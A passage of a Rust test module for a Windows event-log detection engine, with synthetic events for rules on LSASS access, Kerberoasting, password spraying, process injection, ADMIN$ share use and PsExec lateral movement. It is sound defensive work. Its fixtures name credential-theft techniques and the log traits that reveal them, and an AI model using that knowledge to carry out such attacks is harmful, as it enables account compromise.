        let f = find(&out, "windows-lsass-access");
        assert_eq!(f.severity, Severity::Critical);
        assert!(f.mitre.iter().any(|m| m == "T1003.001"));
    }

    #[test]
    fn kerberoasting_rc4_for_service_account_is_flagged() {
        // Two RC4 service-ticket requests for user SPNs, one requester.
        let events = vec![
            win(
                4769,
                1,
                Some("mallory"),
                "DC01",
                None,
                &[("service", "MSSQLSvc/db01"), ("ticket_encryption", "0x17")],
            ),
            win(
                4769,
                2,
                Some("mallory"),
                "DC01",
                None,
                &[("service", "HTTP/web01"), ("ticket_encryption", "0x17")],
            ),
        ];
        let out = detect(&events);
        let f = find(&out, "windows-kerberoasting");
        assert!(f.mitre.iter().any(|m| m == "T1558.003"));
        assert_eq!(f.actor.as_deref(), Some("mallory"));
    }

    #[test]
    fn aes_and_machine_and_krbtgt_tickets_are_not_kerberoasting() {
        let events = vec![
            // AES ticket — not roastable.
            win(
                4769,
                1,
                Some("user"),
                "DC01",
                None,
                &[("service", "MSSQLSvc/db01"), ("ticket_encryption", "0x12")],
            ),
            // Machine account SPN.
            win(
                4769,
                2,
                Some("user"),
                "DC01",
                None,
                &[("service", "WIN-DC01$"), ("ticket_encryption", "0x17")],
            ),
            // krbtgt.
            win(
                4769,
                3,
                Some("user"),
                "DC01",
                None,
                &[("service", "krbtgt"), ("ticket_encryption", "0x17")],
            ),
        ];
        assert!(detect(&events)
            .iter()
            .all(|f| f.rule != "windows-kerberoasting"));
    }

    #[test]
    fn password_spray_across_many_accounts_is_flagged() {
        let mut events = Vec::new();
        for (i, u) in ["alice", "bob", "carol", "dave", "erin", "frank"]
            .iter()
            .enumerate()
        {
            events.push(win(
                4625,
                i as i64,
                Some(u),
                "DC01",
                Some(Outcome::Failure),
                &[("ip", "203.0.113.9")],
            ));
        }
        let out = detect(&events);
        let f = find(&out, "windows-password-spray");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.actor.as_deref(), Some("203.0.113.9"));
    }

    #[test]
    fn repeated_failures_on_one_account_are_not_spray() {
        let events: Vec<_> = (0..6)
            .map(|i| {
                win(
                    4625,
                    i,
                    Some("administrator"),
                    "DC01",
                    Some(Outcome::Failure),
                    &[("ip", "203.0.113.9")],
                )
            })
            .collect();
        let out = detect(&events);
        assert!(out.iter().all(|f| f.rule != "windows-password-spray"));
        // It is a brute-force lead instead.
        assert!(out.iter().any(|f| f.rule == "windows-bruteforce"));
    }

    #[test]
    fn create_remote_thread_is_injection() {
        let events = vec![win(
            8,
            1,
            None,
            "WS1",
            None,
            &[
                ("source_image", "C:\\temp\\evil.exe"),
                ("target_image", "C:\\Windows\\explorer.exe"),
            ],
        )];
        let out = detect(&events);
        assert_eq!(
            find(&out, "windows-process-injection").severity,
            Severity::High
        );
    }

    #[test]
    fn admin_share_from_external_ip_is_high_ipc_is_ignored() {
        let external = vec![win(
            5145,
            1,
            Some("attacker"),
            "SRV",
            None,
            &[("share", "\\\\*\\ADMIN$"), ("ip", "203.0.113.9")],
        )];
        let out = detect(&external);
        assert_eq!(find(&out, "windows-admin-share").severity, Severity::High);
        // IPC$ is everyday traffic, not a lead.
        let ipc = vec![win(
            5145,
            1,
            Some("x"),
            "SRV",
            None,
            &[("share", "\\\\*\\IPC$"), ("ip", "203.0.113.9")],
        )];
        assert!(detect(&ipc).iter().all(|f| f.rule != "windows-admin-share"));
    }

    #[test]
    fn psexec_service_is_remote_execution_lateral_movement() {
        let events = vec![win(
            7045,
            1,
            Some("PSEXESVC"),
            "SRV",
            None,
            &[
                ("service_name", "PSEXESVC"),
                ("image_path", "%SystemRoot%\\PSEXESVC.exe"),
            ],
        )];
        let out = detect(&events);
        let f = find(&out, "windows-remote-service");
        assert!(f.mitre.iter().any(|m| m == "T1021.002"));
    }
}
